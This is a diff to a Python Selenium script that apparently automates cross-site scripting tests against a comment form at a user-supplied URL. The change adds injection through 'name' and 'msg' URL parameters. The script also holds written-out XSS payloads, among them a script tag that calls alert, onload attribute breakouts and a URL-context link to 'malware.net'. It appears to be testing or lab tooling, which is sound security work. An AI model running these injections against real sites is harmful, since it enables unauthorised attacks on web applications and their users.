@@ -52,7 +52,7 @@ class Cli:
 
         parser.add_argument('--url', required=True, dest='url',
                             help=textwrap.dedent('''\
-                                The URL of the address to test against.
+                                The URL of the address to test against. Don't put an ending '/' on it.
                             '''))
         parser.add_argument('--csas', required=False, action='store_true',
                             dest='csas', default=True,
@@ -99,8 +99,8 @@ def generate_payload(context):
         options = [
             # "<b> bolded all day every day</b>",
             # "<i> italics rule</i>",
-             "<h1>HACKED</h1>",
-             "<script> alert('YOU HAVE BEEN HACKED'); </script>",
+            "<h1>HACKED</h1>",
+            "<script> alert('YOU HAVE BEEN HACKED'); </script>",
             #'<input type="file" accept="video/*;capture=camcorder">',
             # '<input type="file" accept="audio/*;capture=microphone">',
             # '<img src="http://forklog.net/wp-content/uploads/2015/05/12035-hacked_article.jpg" />',
@@ -110,7 +110,7 @@ def generate_payload(context):
     elif context == 'HTML_QUOTED':
         return " \" onload=alert('HACKED AGAIN'); x=\""
     elif context == 'HTML_UNQUOTED':
-        return " onload=alert('AND AGAIN');"
+        return " onload=alert('XSSSSSSS');"
     elif context == 'URL_START':
         return 'ftp://malware.net/h4xx0r_malware.exe'
     elif context == 'URL_GENERAL':
@@ -152,11 +152,24 @@ def main():
     driver.get(cli.args.url)
     handle_alert(driver)
     for i, payload in enumerate(generate_all_payloads(CONTEXTS)):
+        submit_form = True
         handle_alert(driver)
         comment_form = driver.find_element_by_id('commentForm')
-        if i in [0, 1, 2, 6]:
+        if i in [0, 6]:
             comment_message = driver.find_element_by_name('message')
             send_key_sequence(comment_message, payload)
+        elif i == 1:
+            submit_form = False
+            comment_message = driver.find_element_by_name('message')
+            comment_name = driver.find_element_by_name('commentName')
+            send_key_sequence(comment_message, "Pre-filling the name field with a GET request in the URL parameters...")
+            driver.get(cli.args.url + '/index.php?name=' + payload)
+        elif i == 2:
+            submit_form = False
+            comment_message = driver.find_element_by_name('message')
+            comment_name = driver.find_element_by_name('commentName')
+            send_key_sequence(comment_name, "Pre-filling the message field with a GET request in the URL parameters...")
+            driver.get(cli.args.url + '/index.php?msg=' + payload)
         elif i in [3, 4, 5]:
             comment_message = driver.find_element_by_name('message')
             comment_link = driver.find_element_by_name('link')
@@ -168,7 +181,8 @@ def main():
             send_key_sequence(comment_message, payload)
             send_key_sequence(comment_link, payload)
 
-        comment_form.submit()
+        if submit_form:
+            comment_form.submit()
         time.sleep(2)
         handle_alert(driver)
 
